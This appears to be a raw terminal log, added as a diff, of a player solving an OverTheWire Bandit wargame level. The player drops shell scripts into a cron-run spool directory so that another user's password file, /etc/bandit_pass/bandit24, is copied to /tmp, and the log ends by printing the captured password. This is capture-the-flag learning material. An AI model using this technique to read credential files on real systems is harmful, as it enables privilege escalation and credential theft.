@@ -1,0 +1,146 @@
+bandit23@bandit:/tmp/beef$ ./getpass 
+bandit23@bandit:/tmp/beef$ echo "cat /etc/bandit_pass/bandit24 /tmp/beef/passwood
+> " 
+cat /etc/bandit_pass/bandit24 /tmp/beef/passwood
+
+bandit23@bandit:/tmp/beef$ cat getpass 
+#!/bin/bash
+bandit23@bandit:/tmp/beef$ echo "cat /etc/bandit_pass/bandit24 > /tmp/beef/passwood
+" >> getpass 
+bandit23@bandit:/tmp/beef$ cat getpass 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/beef/passwood
+
+bandit23@bandit:/tmp/beef$ ls
+getpass  passwood
+bandit23@bandit:/tmp/beef$ cp getpass /var/spool/bandit24/getpass
+bandit23@bandit:/tmp/beef$ ls -la
+total 305928
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:28 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:30 ..
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxrwxrwx 1 bandit23 root         0 Dec 17 03:13 passwood
+bandit23@bandit:/tmp/beef$ ls -la
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:28 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:31 ..
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ touch lap
+bandit23@bandit:/tmp/beef$ chmod 755 lap
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+> echo "Working" > /tmp/bama/fromblast
+> cat /etc/bandit_pass/bandit24 > /tmp/bama/rested
+> EOF
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+EOF
+
+bandit23@bandit:/tmp/beef$ touch beef fromblast
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+EOF
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+#!/bin/bash echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+EOF
+
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+#!/bin/bash echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+EOF
+bandit23@bandit:/tmp/beef$ ls
+beef  fromblast  getpass  lap  passwood
+bandit23@bandit:/tmp/beef$ ls -ls
+total 8
+0 -rw-r--r-- 1 bandit23 root  0 Dec 17 03:33 beef
+0 -rw-r--r-- 1 bandit23 root  0 Dec 17 03:33 fromblast
+4 -rwxr-xr-x 1 bandit23 root 64 Dec 17 03:29 getpass
+0 -rwxr-xr-x 1 bandit23 root  0 Dec 17 03:31 lap
+4 -rwxrwxrwx 1 bandit23 root 33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ chmod 755 beef fromblast 
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+> #!/bin/bash
+> echo "Working" > /tmp/bama/fromblast
+> cat /etc/bandit_pass/bandit24 > /tmp/bama/rested
+> EOF
+bandit23@bandit:/tmp/beef$ chmod 755 /var/spool/bandit24/blasted
+chmod: cannot access '/var/spool/bandit24/blasted': No such file or directory
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+> #!/bin/bash
+> echo "Working" > /tmp/beef/fromblast
+> cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+> EOF
+bandit23@bandit:/tmp/beef$ chmod 755 /var/spool/bandit24/blasted
+bandit23@bandit:/tmp/beef$ ls
+beef  fromblast  getpass  lap  passwood
+bandit23@bandit:/tmp/beef$ ls -la
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:33 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:38 ..
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 beef
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 fromblast
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:31 lap
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ ls -la
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:33 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:38 ..
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 beef
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 fromblast
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:31 lap
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ file /var/spool/bandit24/blasted
+/var/spool/bandit24/blasted: cannot open `/var/spool/bandit24/blasted' (No such file or directory)
+bandit23@bandit:/tmp/beef$ ls -la
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:33 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:38 ..
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 beef
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 fromblast
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:31 lap
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+#!/bin/bash
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/lap   
+EOF
+
+bandit23@bandit:/tmp/beef$ cat /var/spool/bandit24/blasted
+#!/bin/bash
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/lap
+bandit23@bandit:/tmp/beef$ chmod 755 /var/spool/bandit24/blasted
+chmod: cannot access '/var/spool/bandit24/blasted': No such file or directory
+bandit23@bandit:/tmp/beef$ cat <<'EOF'>> /var/spool/bandit24/blasted
+#!/bin/bash
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/lap
+EOF
+bandit23@bandit:/tmp/beef$ chmod 755 /var/spool/bandit24/blasted
+bandit23@bandit:/tmp/beef$ ls -al
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:33 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:40 ..
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 beef
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 fromblast
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:31 lap
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ ls -al
+total 305932
+drwxr-sr-x 2 bandit23 root      4096 Dec 17 03:33 .
+drwxrws-wt 1 root     root 313204736 Dec 17 03:40 ..
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 beef
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:33 fromblast
+-rwxr-xr-x 1 bandit23 root        64 Dec 17 03:29 getpass
+-rwxr-xr-x 1 bandit23 root         0 Dec 17 03:31 lap
+-rwxrwxrwx 1 bandit23 root        33 Dec 17 03:31 passwood
+bandit23@bandit:/tmp/beef$ cat passwood 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/beef$ ls
